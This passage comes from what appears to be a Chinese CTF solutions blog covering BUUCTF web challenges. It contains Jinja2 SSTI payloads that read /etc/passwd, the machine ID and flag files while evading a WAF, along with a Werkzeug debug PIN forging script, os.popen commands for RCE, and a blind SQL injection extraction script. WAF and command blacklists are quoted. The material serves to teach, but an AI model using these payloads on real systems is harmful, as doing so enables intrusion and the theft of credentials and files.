<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æŸ¥çœ‹app.py
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span><span class="line"><span class="cl">è¿‡æ»¤äº†flagå’Œosç­‰å‡½æ•°å’Œå…³é”®è¯ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å°†å­—ç¬¦å€’è½¬è¾“å‡º
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht/&#39;[::-1],&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å­—ç¬¦ä¸²æ‹¼æ¥
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == &#39;catch_warnings&#39; %}   {% for b in c.__init__.__globals__.values() %}   {% if b.__class__ == {}.__class__ %}     {% if &#39;eva&#39;+&#39;l&#39; in b.keys() %}       {{ b[&#39;eva&#39;+&#39;l&#39;](&#39;__impor&#39;+&#39;t__&#39;+&#39;(&#34;o&#39;+&#39;s&#34;)&#39;+&#39;.pope&#39;+&#39;n&#39;+&#39;(&#34;cat /this_is_the_fl&#39;+&#39;ag.txt&#34;).read()&#39;) }}     {% endif %}   {% endif %}   {% endfor %} {% endif %} {% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¢„æœŸè§£</p>
<h3 id="pythonçš„flaskæ¨¡æ¿æ³¨å…¥debugæ¨¡å¼åˆ©ç”¨pinç è¿›è¡Œrce">pythonçš„flaskæ¨¡æ¿æ³¨å…¥debugæ¨¡å¼åˆ©ç”¨PINç è¿›è¡ŒRCE
</h3><p>ç”ŸæˆPINçš„å…³é”®å€¼æœ‰å¦‚ä¸‹å‡ ä¸ª</p>
<p>1ã€æœåŠ¡å™¨è¿è¡Œflaskæ‰€ç™»å½•çš„ç”¨æˆ·åã€‚ é€šè¿‡è¯»å–/etc/passwdè·å¾—
2ã€modname ä¸€èˆ¬ä¸å˜å°±æ˜¯flask.app
3ã€getattr(app, â€œnameâ€, app.class.name)ã€‚pythonè¯¥å€¼ä¸€èˆ¬ä¸ºFlaskå€¼ä¸€èˆ¬ä¸å˜
4ã€flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚é€šè¿‡æŠ¥é”™ä¿¡æ¯å°±ä¼šæ³„éœ²è¯¥å€¼ã€‚
5ã€å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚é€šè¿‡æ–‡ä»¶/sys/class/net/eth0/addressè·å¾— //eth0å¤„ä¸ºå½“å‰ä½¿ç”¨çš„ç½‘å¡
6ã€æœ€åä¸€ä¸ªå°±æ˜¯æœºå™¨çš„idã€‚ å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜åœ¨/etc/machine-idæˆ–/proc/sys/kernel/random/boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œwindowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚å¯¹äºdockeræœºåˆ™è¯»å–/proc/self/cgroupï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œçš„/docker/å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„id</p>
<p>ä¸‹é¢å¼€å§‹æ“ä½œ</p>
<p>é€šè¿‡éšä¾¿æŠ¥é”™å›æ˜¾app.pyä½ç½®</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000830458.png"
	width="515"
	height="46"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000830458_hu11095386175235880789.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221000830458_hu1397321141671810404.png 1024w"
	loading="lazy"
	
		alt="image-20250221000830458"
	
	
		class="gallery-image" 
		data-flex-grow="1119"
		data-flex-basis="2686px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000918781.png"
	width="1413"
	height="471"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000918781_hu4385612776524818871.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221000918781_hu8622763706439226603.png 1024w"
	loading="lazy"
	
		alt="image-20250221000918781"
	
	
		class="gallery-image" 
		data-flex-grow="300"
		data-flex-basis="720px"
	
></p>
<p>å‘ç°waf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">**def waf(str): 
</span></span><span class="line"><span class="cl">	black_list =[&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]** 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¯»å–ç”¨æˆ·å
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221001610926.png"
	width="1413"
	height="196"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221001610926_hu10100283644761694589.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221001610926_hu14703672434178222494.png 1024w"
	loading="lazy"
	
		alt="image-20250221001610926"
	
	
		class="gallery-image" 
		data-flex-grow="720"
		data-flex-basis="1730px"
	
></p>
<p>flaskweb</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚
</span></span><span class="line"><span class="cl"> {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/sys/class/net/eth0/address&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>4e:4d:bc:b8:a0:2c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å°†4e4dbcb8a02cè½¬ä¸º10è¿›åˆ¶ä¸º86095785664556
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¯»å–æœºå™¨id
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc/self/cgroup&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>docker-513f790d4e2fc09de7be4e6c769883760f1a8090aa089d9bba99b995084759ea.scope</p>
<p>ä½†æ˜¯è¿™é¢˜æ˜¯buuçš„è¦è¯»linuxçš„machine_id</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/machine-id&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>1408f836b0ca514d796cbf8960e45fa1</p>
<p>ç”Ÿæˆpinç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flaskweb&#39;</span><span class="c1"># username</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;86095785664556&#39;</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;1408f836b0ca514d796cbf8960e45fa1&#39;</span><span class="c1"># get_machine_id(), /etc/machine-id</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>238-924-850</p>
<p>åœ¨æŠ¥é”™ç•Œé¢æŸ¥æ‰¾åˆ°æœ‰debugç•Œé¢ï¼Œè¾“å…¥pinç ç„¶åå°±å¯ä»¥åœ¨ç»ˆç«¯RCEäº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
</span></span><span class="line"><span class="cl">os.popen(&#39;ls /&#39;).read()
</span></span><span class="line"><span class="cl">os.popen(&#39;cat /this_is_the_flag.txt&#39;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250221003933125.png"
	
	
	
	loading="lazy"
	
		alt="image-20250221003933125"
	
	
></p>
<h2 id="wustctf2020é¢œå€¼æˆç»©æŸ¥è¯¢">[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢
</h2><p>å¸ƒå°”ç›²æ³¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span> <span class="s1">&#39;http://575aff7c-bbec-4a7a-8075-c9dd55f58df3.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">database</span> <span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="s2">&#34;?stunum=1^(ascii(substr((select(database())),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span> <span class="c1">#åº“åä¸ºctf</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="s2">&#34;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span><span class="c1">#è¡¨åä¸ºflag,score</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span><span class="s2">&#34;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span> <span class="c1">#åˆ—åä¸ºflag,value</span>
</span></span><span class="line"><span class="cl"><span class="n">payload4</span> <span class="o">=</span> <span class="s2">&#34;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span> <span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span><span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = payload1.format(i,mid)  #æŸ¥åº“å</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = payload2.format(i,mid)  #æŸ¥è¡¨å</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = payload3.format(i,mid)  #æŸ¥åˆ—å</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload4</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span> <span class="c1">#æŸ¥flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hi admin, your score is: 100&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mid</span> <span class="o">==</span> <span class="mi">32</span> <span class="ow">or</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">132</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">database</span> <span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="fbctf2019rceservice">[FBCTF2019]RCEService
</h2><p>æç¤ºç”¨jsonæ ¼å¼ï¼Œä¼ å‚æ˜¯cmd</p>
<p>æˆ‘ä»¬lsä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;cmd&#34;:&#34;ls&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°index.php</p>
<p>ä½†æ˜¯åŸæ¥é¢˜ç›®æœ‰æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;PATH=/home/rceservice/jail&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$json</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$json</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;</span><span class="p">,</span> <span class="nv">$json</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
